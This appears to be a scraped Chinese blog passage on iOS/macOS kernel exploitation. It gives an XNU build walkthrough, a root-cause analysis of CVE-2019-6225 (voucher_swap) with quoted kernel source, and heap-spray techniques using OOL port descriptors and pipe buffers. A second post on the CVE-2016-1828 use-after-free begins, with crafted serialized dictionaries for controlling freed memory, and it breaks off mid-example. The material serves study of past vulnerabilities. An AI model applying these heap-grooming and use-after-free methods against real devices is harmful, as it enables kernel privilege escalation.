__DATA.__data..Got _localnode_id @0xfffffff008918640Analyzing __DATA.__sysctl_set..Analyzing fuctions...Can't get realhost :-(Analyzing __DATA_CONST.. (1st pass)LAST ARG0 : fffffff00762f420 , fffffff00717a750, 0processing flows...Analyzing __DATA_CONST.. (2nd pass)GOT PTHREAD SHIMS! (0xfffffff0074abbf0)Got 1708 IOKit Classesopened companion file ./kernelcache.release.iphone7.ARM64.9DBCEF3B-873D-358D-B74B-CC7DDDC7546BDumping symbol cache to fileSymbolicated 7318 symbols and 62941 functions XNU编译先看一下源码结构： config- 为支持的架构和平台配置导出的 api。 SETUP- 用于配置内核、版本控制和 kextsymbol 管理的基本工具集。 EXTERNAL_HEADERS- 来自其他项目的头文件，以避免构建时的重复依赖。这些头文件应在源更新时定期同步。 libkern- 用于处理驱动程序和 kexts 的 C++ IOKit 库代码。 libsa- 用于启动的内核引导代码。 libsyscall- 用户空间程序的系统调用库接口。 libkdd- 用于解析内核数据（如内核分块数据）的用户库的源代码。 makedefs- 内核构建的顶级规则和定义。 osfmk- 基于 Mach 内核的子系统。 pexpert- 平台特定代码，如中断处理、原子等。 security- 强制访问检查策略接口和相关实现。 bsd- BSD子系统代码。 tools- 一组用于测试、调试和分析内核的实用程序。 编译(未成功) 可以使用这里的脚本进行编译，亲测有效。 先根据XNU源码版本，确定在开源代码中的位置，以下以xnu-4903.221.2为例进行说明。 12345export TARBALLS=https://opensource.apple.com/tarballs# 下载需要用到源码，对应XNU的版本curl -O ${TARBALLS}/dtrace/dtrace-284.200.15.tar.gzcurl -O ${TARBALLS}/AvailabilityVersions/AvailabilityVersions-33.200.4.tar.gzcurl -O ${TARBALLS}/libdispatch/libdispatch-1008.220.2.tar.gz 编译dtrace123456789tar xf dtrace-284.200.15.tar.gzcd dtrace-284.200.15.tar.gzxcodebuild install -sdk macosx -target ctfconvert \\-target ctfdump -target ctfmerge \\ARCHS='x86_64 arm64' VALID_ARCHS='x86_64 arm64' DSTROOT=$PWD/dstexport TOOLCHAIN=`cd $(xcrun -sdk macosx -show-sdk-platform-path)/../../Toolchains/XcodeDefault.xctoolchain &amp;&amp; pwd`sudo ditto &quot;$PWD/dst/$TOOLCHAIN&quot; &quot;$TOOLCHAIN&quot; 编译错误1error: 'elf.h' file not found with &lt;angled&gt; include; use &quot;quotes&quot; instead 没找到解决方案 编译AvailabilityVersions12345tar zxf AvailabilityVersions-33.200.4.tar.gzcd AvailabilityVersions-33.200.4make installsudo ditto &quot;$PWD/dst/usr/local/libexec&quot; \\&quot;$(xcrun -sdk macosx -show-sdk-path)/usr/local/libexec&quot; 编译libdispatch123456cd libdispatch-1008.220.2xcodebuild install -sdk macosx ARCHS='x86_64 arm64e' \\VALID_ARCHS='x86_64 arm64e' -target libfirehose_kernel \\PRODUCT_NAME=firehose_kernel DSTROOT=$PWD/dstsudo ditto &quot;$PWD/dst/usr/local&quot; \\&quot;$(xcrun -sdk macosx -show-sdk-path)/usr/local&quot; 编译内核安装XNU头文件，依赖于前面的编译结果 123cd xnu-4903.221.2make SDKROOT=macosx ARCH_CONFIGS=&quot;X86_64 ARM64&quot; installhdrssudo ditto &quot;$PWD/BUILD/dst&quot; &quot;$(xcrun -sdk macosx -show-sdk-path)&quot; 内核编译可以基于KERNEL_CONFIGS&amp;ARCH_CONFIGS变量作为参数构建内核： 1make SDKROOT=&lt;sdkroot&gt; ARCH_CONFIGS=&lt;arch&gt; KERNEL_CONFIGS=&lt;variant&gt; 参数解释： &lt;sdkroot&gt;：磁盘上 MacOS SDK 的路径（默认为/）。 &lt;variant&gt;: 可以是debug, development, release,profile并在整个内核代码中配置编译标志和断言。 &lt;arch&gt;：编译架构。（例如i386或X86_64） 一些编译示例： 12$ make SDKROOT=macosx.internal ARCH_CONFIGS=X86_64 KERNEL_CONFIGS=DEVELOPMENT$ make SDKROOT=macosx.internal ARCH_CONFIGS=X86_64 KERNEL_CONFIGS=&quot;RELEASE DEVELOPMENT DEBUG&quot; 直接make表示架构设置为本地架构，默认内核配置为development。 编译没成功，不知道是不是SDK不匹配的原因。 voucher_sawp漏洞的发现漏洞编号为CVE-2019-6225，存在漏洞的xnu内核代码为xnu-4903.221.2。漏洞出现在task_swap_mach_voucher()函数中，主要是MIG生成代码导致的引用计数问题。创建或复制对象会将其引用计数加1，而销毁或覆盖对象会将其引用计数减1。如果对象的引用计数达到零，则将释放该对象。在内存有限的系统中，引用计数比垃圾回收(它是循环发生的，可能会耗费时间)更有效，因为可以在对象的引用计数为零时立即释放对象，从而提高了系统的整体响应能力。 漏洞原因问题出现在task_swap_mach_voucher()（osfmk/kern/task.c）中，功能就是用新的voucher替换旧的voucher： 1234567891011121314/* Placeholders for the task set/get voucher interfaces */......kern_return_ttask_swap_mach_voucher( task_t task, ipc_voucher_t new_voucher, ipc_voucher_t *in_out_old_voucher){ if (TASK_NULL == task) return KERN_INVALID_TASK; *in_out_old_voucher = new_voucher; return KERN_SUCCESS;} 根据注释信息可知，task_swap_mach_voucher函数是一个占位符。可在osfmk/mach/task.defs中找到它： 1234routine task_swap_mach_voucher( task : task_t; new_voucher : ipc_voucher_t; inout old_voucher : ipc_voucher_t); 这意味着它实际上是Mach API，因为MIG def文件为Mach接口生成代码。/BUILD/obj/RELEASE_X86_64/osfmk/mach/task.h中可以找到此函数的Mach消息格式： 12345678910111213#ifdef __MigPackStructs#pragma pack(push, 4)#endif typedef struct { mach_msg_header_t Head; /* start of the kernel processed data */ mach_msg_body_t msgh_body; mach_msg_port_descriptor_t old_voucher; /* end of the kernel processed data */ } __Reply__task_swap_mach_voucher_t __attribute__((unused));#ifdef __MigPackStructs#pragma pack(pop)#endif /BUILD/obj/RELEASE_X86_64/osfmk/RELEASE/mach/task_server.c中可以看到对请求执行的检查： 12345678910111213141516171819202122232425mig_internal kern_return_t __MIG_check__Request__task_swap_mach_voucher_t(__attribute__((__unused__)) __Request__task_swap_mach_voucher_t *In0P){ typedef __Request__task_swap_mach_voucher_t __Request;#if __MigTypeCheck if (!(In0P-&gt;Head.msgh_bits &amp; MACH_MSGH_BITS_COMPLEX) || (In0P-&gt;msgh_body.msgh_descriptor_count != 2) || (In0P-&gt;Head.msgh_size != (mach_msg_size_t)sizeof(__Request))) return MIG_BAD_ARGUMENTS;#endif /* __MigTypeCheck */#if __MigTypeCheck if (In0P-&gt;new_voucher.type != MACH_MSG_PORT_DESCRIPTOR || In0P-&gt;new_voucher.disposition != 17) return MIG_TYPE_ERROR;#endif /* __MigTypeCheck */#if __MigTypeCheck if (In0P-&gt;old_voucher.type != MACH_MSG_PORT_DESCRIPTOR || In0P-&gt;old_voucher.disposition != 17) return MIG_TYPE_ERROR;#endif /* __MigTypeCheck */ return MACH_MSG_SUCCESS;} 实际实现： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121/* Routine task_swap_mach_voucher */mig_internal novalue _Xtask_swap_mach_voucher (mach_msg_header_t *InHeadP, mach_msg_header_t *OutHeadP){#ifdef __MigPackStructs#pragma pack(push, 4)#endif typedef struct { mach_msg_header_t Head; /* start of the kernel processed data */ mach_msg_body_t msgh_body; mach_msg_port_descriptor_t new_voucher; mach_msg_port_descriptor_t old_voucher; /* end of the kernel processed data */ mach_msg_trailer_t trailer; } Request __attribute__((unused));#ifdef __MigPackStructs#pragma pack(pop)#endif typedef __Request__task_swap_mach_voucher_t __Request; typedef __Reply__task_swap_mach_voucher_t Reply __attribute__((unused)); /* * typedef struct { * mach_msg_header_t Head; * NDR_record_t NDR; * kern_return_t RetCode; * } mig_reply_error_t; */ Request *In0P = (Request *) InHeadP; Reply *OutP = (Reply *) OutHeadP;#ifdef __MIG_check__Request__task_swap_mach_voucher_t__defined kern_return_t check_result;#endif /* __MIG_check__Request__task_swap_mach_voucher_t__defined */#if __MigKernelSpecificCode#if UseStaticTemplates const static mach_msg_port_descriptor_t old_voucherTemplate = { /* name = */ MACH_PORT_NULL, /* pad1 = */ 0, /* pad2 = */ 0, /* disp = */ 17, /* type = */ MACH_MSG_PORT_DESCRIPTOR, };#endif /* UseStaticTemplates */#else#if UseStaticTemplates const static mach_msg_port_descriptor_t old_voucherTemplate = { /* name = */ MACH_PORT_NULL, /* pad1 = */ 0, /* pad2 = */ 0, /* disp = */ 19, /* type = */ MACH_MSG_PORT_DESCRIPTOR, };#endif /* UseStaticTemplates */#endif /* __MigKernelSpecificCode */ kern_return_t RetCode; task_t task; ipc_voucher_t new_voucher; ipc_voucher_t old_voucher; __DeclareRcvRpc(3441, &quot;task_swap_mach_voucher&quot;) __BeforeRcvRpc(3441, &quot;task_swap_mach_voucher&quot;)#if defined(__MIG_check__Request__task_swap_mach_voucher_t__defined) check_result = __MIG_check__Request__task_swap_mach_voucher_t((__Request *)In0P); if (check_result != MACH_MSG_SUCCESS) { MIG_RETURN_ERROR(OutP, check_result); }#endif /* defined(__MIG_check__Request__task_swap_mach_voucher_t__defined) */#if UseStaticTemplates OutP-&gt;old_voucher = old_voucherTemplate;#else /* UseStaticTemplates */#if __MigKernelSpecificCode OutP-&gt;old_voucher.disposition = 17;#else OutP-&gt;old_voucher.disposition = 19;#endif /* __MigKernelSpecificCode */#if !(defined(KERNEL) &amp;&amp; defined(__LP64__)) OutP-&gt;old_voucher.pad1 = 0;#endif OutP-&gt;old_voucher.pad2 = 0; OutP-&gt;old_voucher.type = MACH_MSG_PORT_DESCRIPTOR;#if defined(KERNEL) OutP-&gt;old_voucher.pad_end = 0;#endif#endif /* UseStaticTemplates */ task = convert_port_to_task(In0P-&gt;Head.msgh_request_port); new_voucher = convert_port_to_voucher(In0P-&gt;new_voucher.name); old_voucher = convert_port_to_voucher(In0P-&gt;old_voucher.name); RetCode = task_swap_mach_voucher(task, new_voucher, &amp;old_voucher); ipc_voucher_release(new_voucher); task_deallocate(task); if (RetCode != KERN_SUCCESS) { MIG_RETURN_ERROR(OutP, RetCode); }#if __MigKernelSpecificCode if (IP_VALID((ipc_port_t)In0P-&gt;old_voucher.name)) ipc_port_release_send((ipc_port_t)In0P-&gt;old_voucher.name); if (IP_VALID((ipc_port_t)In0P-&gt;new_voucher.name)) ipc_port_release_send((ipc_port_t)In0P-&gt;new_voucher.name);#endif /* __MigKernelSpecificCode */ OutP-&gt;old_voucher.name = (mach_port_t)convert_voucher_to_port(old_voucher); OutP-&gt;Head.msgh_bits |= MACH_MSGH_BITS_COMPLEX; OutP-&gt;Head.msgh_size = (mach_msg_size_t)(sizeof(Reply)); OutP-&gt;msgh_body.msgh_descriptor_count = 1; __AfterRcvRpc(3441, &quot;task_swap_mach_voucher&quot;)} convert_port_to_voucher函数通过调用ipc_voucher_reference函数将引用计数增加1： 1234567891011121314151617181920212223242526272829303132/* * Routine: convert_port_to_voucher * Purpose: * Convert from a port to a voucher. * Doesn't consume the port [send-right] ref; * produces a voucher ref, which may be null. * Conditions: * Caller has a send-right reference to port. * Port may or may not be locked. */ipc_voucher_tconvert_port_to_voucher( ipc_port_t port){ if (IP_VALID(port)) { ipc_voucher_t voucher = (ipc_voucher_t) port-&gt;ip_kobject; /* * No need to lock because we have a reference on the * port, and if it is a true voucher port, that reference * keeps the voucher bound to the port (and active). */ if (ip_kotype(port) != IKOT_VOUCHER) return IV_NULL; assert(ip_active(port)); ipc_voucher_reference(voucher); return (voucher); } return IV_NULL;} convert_voucher_to_port函数通过调用ipc_voucher_release函数将引用计数减少1： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748/* * Convert a voucher to a port. */ipc_port_tconvert_voucher_to_port(ipc_voucher_t voucher){ ipc_port_t port, send; if (IV_NULL == voucher) return (IP_NULL); assert(os_ref_get_count(&amp;voucher-&gt;iv_refs) &gt; 0); /* create a port if needed */ port = voucher-&gt;iv_port; if (!IP_VALID(port)) { port = ipc_port_alloc_kernel(); assert(IP_VALID(port)); ipc_kobject_set_atomically(port, (ipc_kobject_t) voucher, IKOT_VOUCHER); /* If we lose the race, deallocate and pick up the other guy's port */ if (!OSCompareAndSwapPtr(IP_NULL, port, &amp;voucher-&gt;iv_port)) { ipc_port_dealloc_kernel(port); port = voucher-&gt;iv_port; assert(ip_kotype(port) == IKOT_VOUCHER); assert(port-&gt;ip_kobject == (ipc_kobject_t)voucher); } } ip_lock(port); assert(ip_active(port)); send = ipc_port_make_send_locked(port); if (1 == port-&gt;ip_srights) { ipc_port_t old_notify; /* transfer our ref to the port, and arm the no-senders notification */ assert(IP_NULL == port-&gt;ip_nsrequest); ipc_port_nsrequest(port, port-&gt;ip_mscount, ipc_port_make_sonce_locked(port), &amp;old_notify); /* port unlocked */ assert(IP_NULL == old_notify); } else { /* piggyback on the existing port reference, so consume ours */ ip_unlock(port); ipc_voucher_release(voucher); } return (send);} 回到上面的实现中，在task_swap_mach_voucher函数调用后，通过调用ipc_voucher_release函数将new_voucher的引用计数减1： 12RetCode = task_swap_mach_voucher(task, new_voucher, &amp;old_voucher);ipc_voucher_release(new_voucher); 因此，这个过程中，引用计数的变化如下： new_voucher的引用计数+1 =&gt; convert_port_to_voucher() old_voucher的引用计数+1 =&gt; convert_port_to_voucher() old_voucher = new_voucher =&gt; task_swap_mach_voucher() new_voucher的引用计数-1 =&gt; ipc_voucher_release() new_voucher的引用计数-1 (old_voucher = new_voucher) =&gt; convert_voucher_to_port 将new_voucher的引用计数减少为0，从而释放该对象。并且old_voucher的引用计数可以增加很多。如果存储指向new_voucher的指针，然后使用漏洞将new_voucher的引用计数减少为0，这样就有可能获得指向new_voucher的悬空指针。 利用voucher现在需要找到哪里可以存储ipc_voucher指针，方法是直接在内核源码中搜索ipc_voucher_t，发现在osfmk/kern/thread.h的thread对象有一个成员能够持有ipc_voucher指针。 1234567891011121314151617#endif /* CONFIG_EMBEDDED */ uint32_t thread_callout_interrupt_wakeups; uint32_t thread_callout_platform_idle_wakeups; uint32_t thread_timer_wakeups_bin_1; uint32_t thread_timer_wakeups_bin_2; uint16_t thread_tag; uint16_t callout_woken_from_icontext:1, callout_woken_from_platform_idle:1, callout_woke_thread:1, thread_bitfield_unused:13; mach_port_name_t ith_voucher_name; ipc_voucher_t ith_voucher;#if CONFIG_IOSCHED void *decmp_upl;#endif /* CONFIG_IOSCHED */ 使用thread_get_mach_voucher和thread_set_mach_voucher函数从用户态读取和写入voucher引用。查看MIG为该函数生成的代码。 12345678910111213141516171819202122/* Routine thread_get_mach_voucher */mig_internal novalue _Xthread_get_mach_voucher (mach_msg_header_t *InHeadP, mach_msg_header_t *OutHeadP){ ...... thr_act = convert_port_to_thread(In0P-&gt;Head.msgh_request_port); RetCode = thread_get_mach_voucher(thr_act, In0P-&gt;which, &amp;voucher); thread_deallocate(thr_act); if (RetCode != KERN_SUCCESS) { MIG_RETURN_ERROR(OutP, RetCode); }#if __MigKernelSpecificCode#endif /* __MigKernelSpecificCode */ OutP-&gt;voucher.name = (mach_port_t)convert_voucher_to_port(voucher); OutP-&gt;Head.msgh_bits |= MACH_MSGH_BITS_COMPLEX; OutP-&gt;Head.msgh_size = (mach_msg_size_t)(sizeof(Reply)); OutP-&gt;msgh_body.msgh_descriptor_count = 1; __AfterRcvRpc(3625, &quot;thread_get_mach_voucher&quot;)} 一旦获得了指向已释放voucher对象的悬空指针，便可以使用其他对象占用已释放的voucher对象。但这并不容易，voucher通常位于自己的ipc voucher zone中，如osfmk/ipc/ipc_voucher.c所示，其中zinit为voucher分配了一个新zone。 12345678910111213141516171819202122232425262728293031voidipc_voucher_init(void){ natural_t ipc_voucher_max = (task_max + thread_max) * 2; natural_t attr_manager_max = MACH_VOUCHER_ATTR_KEY_NUM_WELL_KNOWN; iv_index_t i; ipc_voucher_zone = zinit(sizeof(struct ipc_voucher), ipc_voucher_max * sizeof(struct ipc_voucher), sizeof(struct ipc_voucher), &quot;ipc vouchers&quot;); zone_change(ipc_voucher_zone, Z_NOENCRYPT, TRUE); ipc_voucher_attr_control_zone = zinit(sizeof(struct ipc_voucher_attr_control), attr_manager_max * sizeof(struct ipc_voucher_attr_control), sizeof(struct ipc_voucher_attr_control), &quot;ipc voucher attr controls&quot;); zone_change(ipc_voucher_attr_control_zone, Z_NOENCRYPT, TRUE); /* initialize voucher hash */ ivht_lock_init(); for (i = 0; i &lt; IV_HASH_BUCKETS; i++) queue_init(&amp;ivht_bucket[i]); /* initialize global table locking */ ivgt_lock_init();#if defined(MACH_VOUCHER_ATTR_KEY_USER_DATA) || defined(MACH_VOUCHER_ATTR_KEY_TEST) user_data_attr_manager_init();#endif} 因此，被释放的voucher的内存将被放置在zone的freelist中，并在创建新voucher时分配给新voucher。为了用其他对象占用，唯一可行的方法是触发zone垃圾收集，它会将被释放的voucher的内存(最小大小为1页)移到zone map中，然后这些内存就可以重新分配给其他对象。可以通过分配大量voucher并释放它们来做到这一点。 回到MIG为thread_get_mach_voucher生成的代码。假设已经使用其他对象占据了已释放的voucher对象，则调用thread_get_mach_voucher应该成功而内核不会panic，这意味着该voucher应该具有有效的iv_refs成员。 随后，调用convert_voucher_to_port函数，该函数首先使用assert()检查voucher是否具有正确的引用计数。然后再使用IP_VALID()检查voucher端口的有效性。如果无效，则会分配一个新的voucher端口。这很有用，因为在分配伪造的voucher占用已释放的voucher时，如果以某种方式将iv_port指针设置为NULL，那么实际上还可以将新分配的voucher端口(IKOT_VOUCHER)返回到用户态(ith_voucher-&gt;iv_port)。这将使我们能够进一步操纵voucher： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748/* * Convert a voucher to a port. */ipc_port_tconvert_voucher_to_port(ipc_voucher_t voucher){ ipc_port_t port, send; if (IV_NULL == voucher) return (IP_NULL); assert(os_ref_get_count(&amp;voucher-&gt;iv_refs) &gt; 0); /* create a port if needed */ port = voucher-&gt;iv_port; if (!IP_VALID(port)) { port = ipc_port_alloc_kernel(); assert(IP_VALID(port)); ipc_kobject_set_atomically(port, (ipc_kobject_t) voucher, IKOT_VOUCHER); /* If we lose the race, deallocate and pick up the other guy's port */ if (!OSCompareAndSwapPtr(IP_NULL, port, &amp;voucher-&gt;iv_port)) { ipc_port_dealloc_kernel(port); port = voucher-&gt;iv_port; assert(ip_kotype(port) == IKOT_VOUCHER); assert(port-&gt;ip_kobject == (ipc_kobject_t)voucher); } } ip_lock(port); assert(ip_active(port)); send = ipc_port_make_send_locked(port); if (1 == port-&gt;ip_srights) { ipc_port_t old_notify; /* transfer our ref to the port, and arm the no-senders notification */ assert(IP_NULL == port-&gt;ip_nsrequest); ipc_port_nsrequest(port, port-&gt;ip_mscount, ipc_port_make_sonce_locked(port), &amp;old_notify); /* port unlocked */ assert(IP_NULL == old_notify); } else { /* piggyback on the existing port reference, so consume ours */ ip_unlock(port); ipc_voucher_release(voucher); } return (send);} 利用OOL端口描述符进行堆风水回顾Mach复杂消息的描述符成员，其中有一个MACH_MSG_OOL_PORTS_DESCRIPTOR消息类型。当通过mach_msg发送Mach消息时依次调用mach_msg_send-&gt;ipc_kmsg_copyin-&gt;ipc_kmsg_copyin_body，在ipc_kmsg_copyin_body函数中对于MACH_MSG_OOL_PORTS_DESCRIPTOR的情况会调用ipc_kmsg_copyin_ool_ports_descriptor函数： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145mach_msg_descriptor_t *ipc_kmsg_copyin_ool_ports_descriptor( mach_msg_ool_ports_descriptor_t *dsc, mach_msg_descriptor_t *user_dsc, int is_64bit, vm_map_t map, ipc_space_t space, ipc_object_t dest, ipc_kmsg_t kmsg, mach_msg_option_t *optionp, mach_msg_return_t *mr){ void *data; ipc_object_t *objects; unsigned int i; mach_vm_offset_t addr; mach_msg_type_name_t user_disp; mach_msg_type_name_t result_disp; mach_msg_type_number_t count; mach_msg_copy_options_t copy_option; boolean_t deallocate; mach_msg_descriptor_type_t type; vm_size_t ports_length, names_length; if (is_64bit) { mach_msg_ool_ports_descriptor64_t *user_ool_dsc = (typeof(user_ool_dsc))user_dsc; addr = (mach_vm_offset_t)user_ool_dsc-&gt;address; count = user_ool_dsc-&gt;count; deallocate = user_ool_dsc-&gt;deallocate; copy_option = user_ool_dsc-&gt;copy; user_disp = user_ool_dsc-&gt;disposition; type = user_ool_dsc-&gt;type; user_dsc = (typeof(user_dsc))(user_ool_dsc+1); } else { mach_msg_ool_ports_descriptor32_t *user_ool_dsc = (typeof(user_ool_dsc))user_dsc; addr = CAST_USER_ADDR_T(user_ool_dsc-&gt;address); count = user_ool_dsc-&gt;count; deallocate = user_ool_dsc-&gt;deallocate; copy_option = user_ool_dsc-&gt;copy; user_disp = user_ool_dsc-&gt;disposition; type = user_ool_dsc-&gt;type; user_dsc = (typeof(user_dsc))(user_ool_dsc+1); } dsc-&gt;deallocate = deallocate; dsc-&gt;copy = copy_option; dsc-&gt;type = type; dsc-&gt;count = count; dsc-&gt;address = NULL; /* for now */ result_disp = ipc_object_copyin_type(user_disp); dsc-&gt;disposition = result_disp; /* We always do a 'physical copy', but you have to specify something valid */ if (copy_option != MACH_MSG_PHYSICAL_COPY &amp;&amp; copy_option != MACH_MSG_VIRTUAL_COPY) { *mr = MACH_SEND_INVALID_TYPE; return NULL; } /* calculate length of data in bytes, rounding up */ if (os_mul_overflow(count, sizeof(mach_port_t), &amp;ports_length)) { *mr = MACH_SEND_TOO_LARGE; return NULL; } if (os_mul_overflow(count, sizeof(mach_port_name_t), &amp;names_length)) { *mr = MACH_SEND_TOO_LARGE; return NULL; } if (ports_length == 0) { return user_dsc; } data = kalloc(ports_length); // 分配内存 if (data == NULL) { *mr = MACH_SEND_NO_BUFFER; return NULL; } #ifdef __LP64__ mach_port_name_t *names = &amp;((mach_port_name_t *)data)[count];#else mach_port_name_t *names = ((mach_port_name_t *)data);#endif if (copyinmap(map, addr, names, names_length) != KERN_SUCCESS) { kfree(data, ports_length); *mr = MACH_SEND_INVALID_MEMORY; return NULL; } if (deallocate) { (void) mach_vm_deallocate(map, addr, (mach_vm_size_t)ports_length); } objects = (ipc_object_t *) data; // 转ipc_object_t类型 dsc-&gt;address = data; for ( i = 0; i &lt; count; i++) { mach_port_name_t name = names[i]; ipc_object_t object; if (!MACH_PORT_VALID(name)) { objects[i] = (ipc_object_t)CAST_MACH_NAME_TO_PORT(name); continue; } kern_return_t kr = ipc_object_copyin(space, name, user_disp, &amp;object); if (kr != KERN_SUCCESS) { unsigned int j; for(j = 0; j &lt; i; j++) { object = objects[j]; if (IPC_OBJECT_VALID(object)) ipc_object_destroy(object, result_disp); } kfree(data, ports_length); dsc-&gt;address = NULL; if ((*optionp &amp; MACH_SEND_KERNEL) == 0) { mach_port_guard_exception(name, 0, 0, kGUARD_EXC_SEND_INVALID_RIGHT); } *mr = MACH_SEND_INVALID_RIGHT; return NULL; } if ((dsc-&gt;disposition == MACH_MSG_TYPE_PORT_RECEIVE) &amp;&amp; ipc_port_check_circularity( (ipc_port_t) object, (ipc_port_t) dest)) kmsg-&gt;ikm_header-&gt;msgh_bits |= MACH_MSGH_BITS_CIRCULAR; objects[i] = object; } return user_dsc;} 这里使用kalloc分配内存，然后转换为ipc_object_t类型，这是一个端口指针的数组。因此可以使用OOL端口描述符发送大量Mach消息，可以使用有效指针或0xFFFFFFFFFFFFFFFFFF(MACH_PORT_DEAD)或0x0000000000000000(MACH_PORT_NULL)填充kalloc zone。 管道缓冲区管道是xnu中另一个用于IPC的系统调用。它创建一个 分配一对文件描述符并允许单向数据流的管道。数据流经的缓冲区称为管道缓冲区。可以从缓冲区的读取端读取写入缓冲区的写入端的数据，但是不能反过来。基本上你可以在同一地址空间中进行读写。另一个重要的事情是它占用内核虚拟地址空间，因此是在堆中分配内存的有用原语。默认情况管道缓冲区的大小设置为最大16384字节，所有管道缓冲区的大小设置为最大16MB。 12345678910111213141516/* * Pipe buffer size, keep moderate in value, pipes take kva space. */#ifndef PIPE_SIZE#define PIPE_SIZE 16384#endif#define PIPE_KVAMAX (1024 * 1024 * 16)#ifndef BIG_PIPE_SIZE#define BIG_PIPE_SIZE (64*1024)#endif#ifndef SMALL_PIPE_SIZE#define SMALL_PIPE_SIZE PAGE_SIZE#endif 如果数据已被写入管道缓冲区并且管道缓冲区已满，则认为该管道缓冲区已阻塞。要释放该管道缓冲区必须从中读取数据。可以通过分配许多管道缓冲区并将数据写入其中来利用管道缓冲区进行喷射。可以创建的管道总数是16MB除以16384字节，即1024。 管道缓冲区的优势在于，如果能够获得指向其中一个管道缓冲区的指针并读取其值，则基本上可以识别出是这1024个管道缓冲区中的哪个，然后就可以在这个特定的管道缓冲区中重新分配数据。 Exploit也可以直接去看Exp，里面注释很详细。 附录Project Zero Issue tracker [iOS 10 - Kernel Heap Revisited](https://gsec.hitb.org/materials/sg2016/D2 - Stefan Esser - iOS 10 Kernel Heap Revisited.pdf) Mac OS X Internals: A Systems Approach MacOS and iOS Internals, Volume III: Security &amp; Insecurity CanSecWest 2017 - Port(al) to the iOS Core Project Zero Issue tracker [iOS 10 - Kernel Heap Revisited](https://gsec.hitb.org/materials/sg2016/D2 - Stefan Esser - iOS 10 Kernel Heap Revisited.pdf) Mac OS X Internals: A Systems Approach MacOS and iOS Internals, Volume III: Security &amp; Insecurity CanSecWest 2017 - Port(al) to the iOS Core","link":"/2022/03/18/%E4%BB%8Evoucher_swap%E6%BC%8F%E6%B4%9E%E5%BC%80%E5%A7%8B%E5%AD%A6iOS%E5%86%85%E6%A0%B8%E5%88%A9%E7%94%A8/"},{"title":"","text":"CVE-2016-1828UAF 提权漏洞。 影响范围10.11.4 发现过程看内核代码时发现的 漏洞原理CVE-2016-1828：是OSUnserializeBinary函数中的一个UAF，通过给这个函数传递一个恶意的二进制blob，将导致该函数调用一个对象的虚函数，这个虚函数指针是被控制的。作者是利用这个漏洞实现了NULL指针解引用。 CVE-2016-1758：是 if_clone_list函数中的一个内核栈信息泄露，一个8字节的未初始化的内核栈信息被复制到用户空间中。这些字节可以在触发漏洞之前，通过syscall调用初始化为内核text地址。获取到泄漏的text指针后，通过减掉已知的text地址，可以计算出kernel slide。 OSUnserializeBinary当用户空间与内核空间，需要传递一些数据，如字符串、数组、字典等。Libkern 通过定义容器和集合类，与传递给用户空间 API 的 CoreFoundation 对象相对应，使数据交换变得简单。这些类都继承自OSObject，在下面的表格中列出。 XML tag CoreFoundation class Libkern class Contents true or false CFBoolean OSBoolean Boolean true or false data CFData OSData Array of bytes integer CFNumber OSNumber Integer value string CFString OSString Array of characters OSSymbol Reference to unique string array CFArray OSArray Array of objects dict CFDictionary OSDictionary Map of strings to objects set CFSet OSSet Set of unique objects 当一个CoreFoundation对象传递给内核空间时，首先通过 IOCFSerialize转化为二进制或XML形式。序列化的数据被传递进内核，并通过 OSUnserializeXML进行反序列化。如果数据是二进制的，OSUnserializeXML将调用 OSUnserializeBinary 函数。 OSUnserializeBinary函数尝试解码和重建数据。通常，反序列化的对象包含若干个entry。当一个对象在数据中被包含了几次，为了减小序列化后的大小，二进制序列化方式支持通过下标引用之前的序列化对象。因此，反序列化的逻辑是将重建的对象被存储在一个数组中，方便后续通过下标进行引用。 大概是出于效率考虑，这个数组并不是像OSArray一样进行自动管理，取而代之的是，OSUnserializeBinary手动管理一个动态分配的OSObject数组指针。当一个新的对象被反序列化后，它被添加到 objsArray数组的末尾，而没有增加它的引用计数。这应该是安全的，因为每一个生成的对象被存储在其父节点中，父节点增加其引用以使其保持存活。 当一个节点在反序列化过程中，被通过下标进行引用时，对象指针将在objsArray中进行查找，存储在变量o中： 123456case kOSSerializeObject: if (len &gt;= objsIdx) break; o = objsArray[len]; o-&gt;retain(); isRef = true; break; o在被插入到父集合中后就会删除： 1234if (o != dict) ok = dict-&gt;setObject(sym, o);o-&gt;release();sym-&gt;release();sym = 0; UAF可惜的是，这种想法其实不一定很安全，因为存储的对象在反序列化的过程中可能被释放，成了一个悬空指针。 对于一个序列化的字典，其中的键可能被赋值好几次： 12345678&lt;dict&gt; &lt;!-- object 0 --&gt; &lt;key&gt;a&lt;/key&gt; &lt;!-- object 1 --&gt; &lt;string&gt;foo&lt;/string&gt; &lt;!-- object 2 --&gt; &lt;key&gt;a&lt;/key&gt; &lt;!-- object 3 --&gt; &lt;string&gt;bar&lt;/string&gt; &lt;!-- object 4 --&gt; &lt;key&gt;b&lt;/key&gt; &lt;!-- object 5 --&gt; &lt;object&gt;2&lt;/object&gt; &lt;!-- object 6 --&gt;&lt;/dict&gt; 当bar被反序列化出来时，它会去替换foo，foo的引用计数就要被释放一个，这将导致在 objsArray[2]处出现一个悬空指针。 漏洞利用控制已释放的内存中的内容，通过我们控制的虚指针调用retain函数。 我们可以控制在序列化的过程中，对象何时分配、何时释放； 我们可以控制内存中的内容，通过在字典中添加一个OSData对象。 要想控制对象的虚指针，我们需要确保已释放的对象内存被用来分配OSData对象数据缓冲区，而不是OSData对象本身。但是，OSData对象在它的数据缓冲区之前被分配，所以，我们将创建两个OSData对象，第一个被用来重新分配OSData对象，第二个则包含假的虚指针。 1234567891011121314&lt;dict&gt; &lt;!-- 0: dict --&gt; &lt;key&gt;a&lt;/key&gt; &lt;!-- 1: key &quot;a&quot; --&gt; &lt;integer&gt;10&lt;/integer&gt; &lt;!-- 2: allocate block1 --&gt; &lt;key&gt;b&lt;/key&gt; &lt;!-- 3: key &quot;b&quot; --&gt; &lt;integer&gt;20&lt;/integer&gt; &lt;!-- 4: allocate block2 --&gt; &lt;key&gt;a&lt;/key&gt; &lt;!-- 5: key &quot;a&quot; --&gt; &lt;true/&gt; &lt;!-- 6: free block1; free list: block1 --&gt; &lt;key&gt;b&lt;/key&gt; &lt;!-- 7: key &quot;b&quot; --&gt; 